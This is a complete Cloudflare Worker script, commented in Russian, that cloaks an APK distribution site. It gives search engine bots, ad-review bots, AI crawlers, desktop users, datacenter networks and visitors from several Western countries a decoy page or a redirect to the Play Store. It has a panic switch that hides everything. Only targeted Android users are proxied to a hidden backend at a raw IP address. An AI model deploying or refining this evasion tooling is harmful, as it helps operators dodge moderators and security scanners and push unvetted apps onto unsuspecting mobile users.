// APK Traffic Filter — Cloudflare Worker
// Первая линия обороны: Edge-фильтрация за 2-5мс

// Дефолтные стоп-листы (используются если KV недоступен)
const DEFAULT_BLOCKED_COUNTRIES = "US,GB,DE,FR,NL,SE,CA,AU,JP,SG,IN";
const DEFAULT_BLOCKED_ASNS = "15169,16591,396982,8075,714,16509,14618,13335,14061,24940,63949,16276,136907,32934,36459,20473";
const DEFAULT_BLOCKED_UA = "Googlebot,AdsBot-Google,Mediapartners-Google,bingbot,YandexBot,facebookexternalhit,Twitterbot,Bytespider,GPTBot,ClaudeBot,PetalBot,Amazonbot,SemrushBot,AhrefsBot,MJ12bot,DotBot";
const DEFAULT_DESKTOP_UA = "Windows NT,Macintosh,X11,Linux x86_64,CrOS";

const FAKE_HTML = `<!DOCTYPE html>
<html><head><title>App</title><meta name="robots" content="noindex"></head>
<body><h1>Welcome</h1><p>This content is not available in your region.</p></body>
</html>`;

export default {
  async fetch(request, env) {
    const startTime = Date.now();
    const url = new URL(request.url);
    const headers = Object.fromEntries(request.headers);
    const cf = request.cf || {};

    const ip = headers["cf-connecting-ip"] || headers["x-forwarded-for"] || "0.0.0.0";
    const country = (cf.country || headers["cf-ipcountry"] || "").toUpperCase();
    const asn = String(cf.asn || "0");
    const userAgent = headers["user-agent"] || "";
    const clientSecret = headers["x-client-secret"] || "";

    // Получаем настройки из KV или env/defaults
    const panicMode = await getKV(env, "PANIC_MODE", "false");
    const whiteFlowType = await getKV(env, "WHITE_FLOW_TYPE", "redirect_safe");
    const safeUrl = env.SAFE_URL || "https://play.google.com/store";
    const secret = await getKV(env, "CLIENT_SECRET", env.CLIENT_SECRET || "");
    const backendUrl = env.BACKEND_URL || "http://31.76.251.103/engine";

    // === ПАНИКА: весь трафик на белую ===
    if (panicMode === "true") {
      return makeWhiteResponse(whiteFlowType, safeUrl, "panic_mode");
    }

    // === ПРОВЕРКА 1: X-Client-Secret ===
    if (secret && clientSecret !== secret) {
      return makeWhiteResponse(whiteFlowType, safeUrl, "no_client_secret");
    }

    // === ПРОВЕРКА 2: User-Agent (боты + десктоп) ===
    const blockedUA = await getKV(env, "BLOCKED_UA", DEFAULT_BLOCKED_UA);
    const uaLower = userAgent.toLowerCase();

    for (const pattern of blockedUA.split(",")) {
      if (pattern.trim() && uaLower.includes(pattern.trim().toLowerCase())) {
        return makeWhiteResponse(whiteFlowType, safeUrl, "bot_user_agent");
      }
    }

    const desktopUA = await getKV(env, "DESKTOP_UA", DEFAULT_DESKTOP_UA);
    for (const pattern of desktopUA.split(",")) {
      if (pattern.trim() && userAgent.includes(pattern.trim())) {
        return makeWhiteResponse(whiteFlowType, safeUrl, "desktop_user_agent");
      }
    }

    // Нет "Android" в UA → не мобильное устройство
    if (!uaLower.includes("android")) {
      return makeWhiteResponse(whiteFlowType, safeUrl, "not_android");
    }

    // === ПРОВЕРКА 3: Гео (страна) ===
    if (country) {
      const blockedCountries = await getKV(env, "BLOCKED_COUNTRIES", DEFAULT_BLOCKED_COUNTRIES);
      const countrySet = new Set(blockedCountries.split(",").map(c => c.trim().toUpperCase()));
      if (countrySet.has(country)) {
        return makeWhiteResponse(whiteFlowType, safeUrl, "country_blocked");
      }
    }

    // === ПРОВЕРКА 4: ASN (датацентры) ===
    if (asn !== "0") {
      const blockedASNs = await getKV(env, "BLOCKED_ASNS", DEFAULT_BLOCKED_ASNS);
      const asnSet = new Set(blockedASNs.split(",").map(a => a.trim()));
      if (asnSet.has(asn)) {
        return makeWhiteResponse(whiteFlowType, safeUrl, "asn_blocked");
      }
    }

    // === ВСЁ ЧИСТО → PROXY К БЭКЕНДУ ===
    const originUrl = backendUrl + url.pathname + url.search;

    const originRequest = new Request(originUrl, {
      method: request.method,
      headers: new Headers({
        ...headers,
        "X-Forwarded-For": ip,
        "X-Real-IP": ip,
        "X-CF-Country": country,
        "X-CF-ASN": asn,
        "X-CF-Ray": headers["cf-ray"] || "",
        "X-Filter-Time": String(Date.now() - startTime),
      }),
      body: request.method !== "GET" && request.method !== "HEAD"
        ? request.body
        : undefined,
    });

    try {
      const response = await fetch(originRequest, {
        cf: { resolveOverride: undefined },
      });
      const newResponse = new Response(response.body, response);
      newResponse.headers.set("X-CF-Filtered", "true");
      newResponse.headers.set("X-CF-Filter-Time", String(Date.now() - startTime) + "ms");
      return newResponse;
    } catch (err) {
      return new Response("Origin unavailable", { status: 502 });
    }
  },
};

// === Helpers ===

async function getKV(env, key, defaultValue) {
  if (env.CONFIG) {
    try {
      const val = await env.CONFIG.get(key);
      if (val !== null) return val;
    } catch (e) {}
  }
  return defaultValue;
}

function makeWhiteResponse(flowType, safeUrl, rejectionCode) {
  const headers = {
    "X-Rejection-Code": rejectionCode,
    "X-Filtered-By": "cf-worker",
  };

  switch (flowType) {
    case "show_403":
      return new Response("Forbidden", { status: 403, headers });
    case "show_404":
      return new Response("Not Found", { status: 404, headers });
    case "fake_html":
      return new Response(FAKE_HTML, {
        status: 200,
        headers: { ...headers, "Content-Type": "text/html;charset=UTF-8" },
      });
    case "redirect_safe":
    default:
      return Response.redirect(safeUrl, 302);
  }
}
